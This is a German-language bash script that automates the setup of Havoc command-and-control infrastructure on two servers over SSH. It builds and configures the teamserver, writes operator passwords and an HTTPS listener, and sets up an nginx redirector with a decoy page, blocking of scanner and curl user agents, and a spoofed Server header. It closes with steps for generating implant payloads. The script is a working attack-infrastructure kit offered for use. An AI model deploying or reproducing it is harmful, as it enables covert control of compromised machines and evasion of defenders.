#!/bin/bash
#
# MASTER ORCHESTRATION SCRIPT
# Richtet BEIDE VPS automatisch ein!
#
# Sie geben nur:
#   - Teamserver-IP
#   - Redirector-IP  
#   - Domain
#
# Script macht den REST!
#
# VERWENDUNG:
#   bash master_orchestration.sh
#

set -e

clear
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║                                                               ║"
echo "║     HAVOC C2 - MASTER ORCHESTRATION                         ║"
echo "║     Automatische Einrichtung BEIDER VPS!                     ║"
echo "║                                                               ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""
echo "Dieses Script richtet automatisch ein:"
echo "  ✓ Teamserver (BuyVM)"
echo "  ✓ Redirector (Njalla/1984)"
echo "  ✓ DNS-Konfiguration"
echo "  ✓ Firewall-Regeln"
echo "  ✓ SSL-Zertifikate"
echo ""
echo "Sie müssen nur 3 Informationen eingeben!"
echo ""

# ═══════════════════════════════════════════════════════════════
# SCHRITT 1: INFORMATIONEN SAMMELN
# ═══════════════════════════════════════════════════════════════

echo "═══════════════════════════════════════════════════════════════"
echo " SCHRITT 1: Ihre VPS-Informationen"
echo "═══════════════════════════════════════════════════════════════"
echo ""

read -p "Teamserver-IP (BuyVM):  " TEAMSERVER_IP
if [ -z "$TEAMSERVER_IP" ]; then
    echo "[!] Teamserver-IP ist erforderlich!"
    exit 1
fi

read -p "Redirector-IP (Njalla): " REDIRECTOR_IP
if [ -z "$REDIRECTOR_IP" ]; then
    echo "[!] Redirector-IP ist erforderlich!"
    exit 1
fi

read -p "Domain (z.B. cdn.example.com): " DOMAIN
if [ -z "$DOMAIN" ]; then
    echo "[!] Domain ist erforderlich!"
    exit 1
fi

read -p "Email (für SSL): " EMAIL
EMAIL=${EMAIL:-admin@${DOMAIN}}

# Passwörter generieren
ADMIN_PASS=$(openssl rand -base64 20 | tr -d '/+=' | head -c 20)
OPERATOR_PASS=$(openssl rand -base64 20 | tr -d '/+=' | head -c 20)

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo " Konfiguration:"
echo "═══════════════════════════════════════════════════════════════"
echo "  Teamserver:  $TEAMSERVER_IP"
echo "  Redirector:  $REDIRECTOR_IP"
echo "  Domain:      $DOMAIN"
echo "  Email:       $EMAIL"
echo ""
echo "  Admin-Pass:  $ADMIN_PASS (automatisch generiert)"
echo "  Oper-Pass:   $OPERATOR_PASS (automatisch generiert)"
echo ""

read -p "Fortfahren? (y/n) " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    exit 1
fi

# ═══════════════════════════════════════════════════════════════
# SCHRITT 2: SSH-VERBINDUNG TESTEN
# ═══════════════════════════════════════════════════════════════

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo " SCHRITT 2: Teste SSH-Verbindungen"
echo "═══════════════════════════════════════════════════════════════"
echo ""

echo "[*] Teste Teamserver..."
if ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@$TEAMSERVER_IP "echo 'OK'" >/dev/null 2>&1; then
    echo "    ✓ Teamserver erreichbar"
else
    echo "    ✗ Teamserver NICHT erreichbar!"
    echo "    Prüfen Sie SSH-Key oder Root-Zugang"
    exit 1
fi

echo "[*] Teste Redirector..."
if ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@$REDIRECTOR_IP "echo 'OK'" >/dev/null 2>&1; then
    echo "    ✓ Redirector erreichbar"
else
    echo "    ✗ Redirector NICHT erreichbar!"
    exit 1
fi

# ═══════════════════════════════════════════════════════════════
# SCHRITT 3: TEAMSERVER INSTALLATION
# ═══════════════════════════════════════════════════════════════

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo " SCHRITT 3: Installiere Teamserver (15 Minuten)"
echo "═══════════════════════════════════════════════════════════════"
echo ""

ssh -o StrictHostKeyChecking=no root@$TEAMSERVER_IP << ENDTEAMSERVER
set -e

echo "[1/6] Aktualisiere System..."
export DEBIAN_FRONTEND=noninteractive
apt update -qq
apt upgrade -y -qq

echo "[2/6] Installiere Dependencies..."
apt install -y -qq build-essential cmake golang-go mingw-w64 nasm \
    libboost-all-dev libssl-dev ufw git

echo "[3/6] Klone Havoc..."
if [ ! -d "/opt/Havoc" ]; then
    cd /opt
    git clone https://github.com/HavocFramework/Havoc.git
fi

echo "[4/6] Kompiliere Teamserver (bitte warten)..."
cd /opt/Havoc/teamserver
go mod download 2>/dev/null || true
cd /opt/Havoc
make ts-build

echo "[5/6] Erstelle Konfiguration..."
mkdir -p /opt/Havoc/profiles

cat > /opt/Havoc/profiles/havoc.yaotl << 'ENDCONFIG'
Teamserver:
  Host: 0.0.0.0
  Port: 40056
  Build:
    Compiler64: "/usr/bin/x86_64-w64-mingw32-gcc"
    Compiler86: "/usr/bin/i686-w64-mingw32-gcc"
    Nasm: "/usr/bin/nasm"
Operators:
  - Name: admin
    Password: "$ADMIN_PASS"
  - Name: operator1
    Password: "$OPERATOR_PASS"
Listeners:
  - Name: "HTTPS Listener"
    Protocol: https
    Hosts:
      - "$DOMAIN"
    Port: 443
    HostBind: 0.0.0.0
    PortBind: 443
    Secure: true
ENDCONFIG

sed -i "s/\\\$ADMIN_PASS/$ADMIN_PASS/g" /opt/Havoc/profiles/havoc.yaotl
sed -i "s/\\\$OPERATOR_PASS/$OPERATOR_PASS/g" /opt/Havoc/profiles/havoc.yaotl
sed -i "s/\\\$DOMAIN/$DOMAIN/g" /opt/Havoc/profiles/havoc.yaotl

cat > /etc/systemd/system/havoc-teamserver.service << 'ENDSERVICE'
[Unit]
Description=Havoc C2 Teamserver
After=network.target
[Service]
Type=simple
User=root
WorkingDirectory=/opt/Havoc
ExecStart=/opt/Havoc/havoc server --profile /opt/Havoc/profiles/havoc.yaotl -v
Restart=on-failure
RestartSec=10
[Install]
WantedBy=multi-user.target
ENDSERVICE

systemctl daemon-reload
systemctl enable havoc-teamserver
systemctl start havoc-teamserver

echo "[6/6] Konfiguriere Firewall..."
ufw --force enable
ufw allow 22/tcp
ufw allow 40056/tcp
ufw allow from $REDIRECTOR_IP to any port 443 proto tcp

echo "✓ Teamserver installiert!"
ENDTEAMSERVER

echo ""
echo "✓ Teamserver-Installation abgeschlossen!"

# ═══════════════════════════════════════════════════════════════
# SCHRITT 4: REDIRECTOR INSTALLATION
# ═══════════════════════════════════════════════════════════════

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo " SCHRITT 4: Installiere Redirector (10 Minuten)"
echo "═══════════════════════════════════════════════════════════════"
echo ""

ssh -o StrictHostKeyChecking=no root@$REDIRECTOR_IP << ENDREDIRECTOR
set -e

echo "[1/5] Aktualisiere System..."
export DEBIAN_FRONTEND=noninteractive
apt update -qq
apt upgrade -y -qq

echo "[2/5] Installiere Nginx..."
apt install -y -qq nginx certbot python3-certbot-nginx ufw

echo "[3/5] Konfiguriere Nginx..."

cat > /etc/nginx/sites-available/redirector << 'ENDNGINX'
upstream c2_backend {
    server $TEAMSERVER_IP:443;
}

server {
    listen 80;
    server_name $DOMAIN;
    location /.well-known/acme-challenge/ {
        root /var/www/html;
    }
    location / {
        return 301 https://\\\$server_name\\\$request_uri;
    }
}

server {
    listen 443 ssl http2;
    server_name $DOMAIN;
    
    ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    
    add_header Server "nginx/1.18.0" always;
    
    access_log /var/log/nginx/access.log;
    
    if (\\\$http_user_agent ~* "(bot|spider|crawler|scanner|curl|wget|python)") {
        return 403;
    }
    
    location ~ ^/api {
        proxy_pass https://c2_backend;
        proxy_set_header Host \\\$host;
        proxy_set_header X-Real-IP \\\$remote_addr;
        proxy_ssl_verify off;
        proxy_buffering off;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \\\$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
    
    location / {
        root /var/www/html;
        index index.html;
    }
}
ENDNGINX

sed -i "s/\\\$TEAMSERVER_IP/$TEAMSERVER_IP/g" /etc/nginx/sites-available/redirector
sed -i "s/\\\$DOMAIN/$DOMAIN/g" /etc/nginx/sites-available/redirector

mkdir -p /var/www/html
echo "<h1>Under Construction</h1>" > /var/www/html/index.html

rm -f /etc/nginx/sites-enabled/default
ln -sf /etc/nginx/sites-available/redirector /etc/nginx/sites-enabled/
nginx -t
systemctl restart nginx

echo "[4/5] Konfiguriere Firewall..."
ufw --force enable
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp

echo "[5/5] Hole SSL-Zertifikat..."
certbot --nginx -d $DOMAIN --non-interactive --agree-tos -m $EMAIL --redirect || echo "[!] SSL später nachholen"

echo "✓ Redirector installiert!"
ENDREDIRECTOR

echo ""
echo "✓ Redirector-Installation abgeschlossen!"

# ═══════════════════════════════════════════════════════════════
# SCHRITT 5: FINALE KONFIGURATION
# ═══════════════════════════════════════════════════════════════

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo " SCHRITT 5: Finale Konfiguration"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Test-Verbindungen
echo "[*] Teste Infrastruktur..."

echo "    Teamserver Port 40056..."
if nc -zv -w 5 $TEAMSERVER_IP 40056 >/dev/null 2>&1; then
    echo "    ✓ Erreichbar"
else
    echo "    ✗ NICHT erreichbar - prüfen Sie Firewall"
fi

echo "    Redirector HTTPS..."
if curl -s --max-time 5 https://$DOMAIN/ >/dev/null 2>&1; then
    echo "    ✓ Erreichbar"
else
    echo "    ! SSL noch nicht fertig (normal bei frischer Installation)"
fi

# ═══════════════════════════════════════════════════════════════
# CREDENTIALS SPEICHERN
# ═══════════════════════════════════════════════════════════════

CREDS_FILE="./HAVOC_ZUGANGSDATEN.txt"

cat > "$CREDS_FILE" << ENDCREDS
╔═══════════════════════════════════════════════════════════════╗
║              HAVOC C2 - ZUGANGSDATEN                         ║
║              (SICHER AUFBEWAHREN!)                            ║
╚═══════════════════════════════════════════════════════════════╝

Installation: $(date)

═══════════════════════════════════════════════════════════════
VPS 1 - TEAMSERVER (BuyVM):
═══════════════════════════════════════════════════════════════

SSH-Zugang:
  IP:       $TEAMSERVER_IP
  Befehl:   ssh root@$TEAMSERVER_IP

HAVOC TEAMSERVER:
  Host:     $TEAMSERVER_IP
  Port:     40056
  
  Admin:
    Username: admin
    Password: $ADMIN_PASS
  
  Operator:
    Username: operator1
    Password: $OPERATOR_PASS

Status prüfen:
  ssh root@$TEAMSERVER_IP "systemctl status havoc-teamserver"

Logs ansehen:
  ssh root@$TEAMSERVER_IP "journalctl -u havoc-teamserver -f"

═══════════════════════════════════════════════════════════════
VPS 2 - REDIRECTOR (Njalla):
═══════════════════════════════════════════════════════════════

SSH-Zugang:
  IP:       $REDIRECTOR_IP
  Befehl:   ssh root@$REDIRECTOR_IP

Redirector:
  Domain:   $DOMAIN
  URL:      https://$DOMAIN/
  Backend:  $TEAMSERVER_IP:443

Status prüfen:
  ssh root@$REDIRECTOR_IP "systemctl status nginx"

Logs ansehen:
  ssh root@$REDIRECTOR_IP "tail -f /var/log/nginx/access.log"

SSL erneuern:
  ssh root@$REDIRECTOR_IP "certbot renew"

═══════════════════════════════════════════════════════════════
HAVOC CLIENT (Auf Ihrem PC):
═══════════════════════════════════════════════════════════════

Verbindung:
  1. Havoc Client starten: ./Havoc
  2. New Profile erstellen
  3. Eingeben:
     Host:     $TEAMSERVER_IP
     Port:     40056
     User:     admin
     Password: $ADMIN_PASS
  4. Connect

Listener:
  Name:  HTTPS Listener
  URL:   https://$DOMAIN:443

Payload generieren:
  Attack → Payload
  Listener: HTTPS Listener
  Host wird sein: $DOMAIN

═══════════════════════════════════════════════════════════════
TESTS:
═══════════════════════════════════════════════════════════════

1. Teamserver erreichbar:
   nc -zv $TEAMSERVER_IP 40056

2. Redirector erreichbar:
   curl https://$DOMAIN/

3. Redirector → Teamserver:
   curl -k https://$DOMAIN/api/test

═══════════════════════════════════════════════════════════════
WICHTIG:
═══════════════════════════════════════════════════════════════

⚠️  Speichern Sie diese Datei in Password-Manager!
⚠️  Löschen Sie dann diese Datei:
    shred -vfz -n 10 $CREDS_FILE

═══════════════════════════════════════════════════════════════
ENDCREDS

chmod 600 "$CREDS_FILE"

# ═══════════════════════════════════════════════════════════════
# FERTIG
# ═══════════════════════════════════════════════════════════════

clear
echo ""
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║                                                               ║"
echo "║          ✅  INSTALLATION ERFOLGREICH!                       ║"
echo "║                                                               ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""
echo ""

cat "$CREDS_FILE"

echo ""
echo ""
echo "═══════════════════════════════════════════════════════════════"
echo " Credentials gespeichert in: $CREDS_FILE"
echo " Bitte sichern und dann löschen!"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "NÄCHSTE SCHRITTE:"
echo ""
echo "1. Havoc Client installieren (auf diesem PC):"
echo "   cd ~ && git clone https://github.com/HavocFramework/Havoc.git"
echo "   cd Havoc && make client-build"
echo ""
echo "2. Client starten:"
echo "   cd ~/Havoc/Build/bin && ./Havoc"
echo ""
echo "3. Verbinden:"
echo "   Host: $TEAMSERVER_IP"
echo "   Port: 40056"
echo "   User: admin"
echo "   Pass: $ADMIN_PASS"
echo ""
echo "4. Payload generieren mit Domain: $DOMAIN"
echo ""
echo "✅ Setup komplett! Viel Erfolg! 🚀"
echo ""
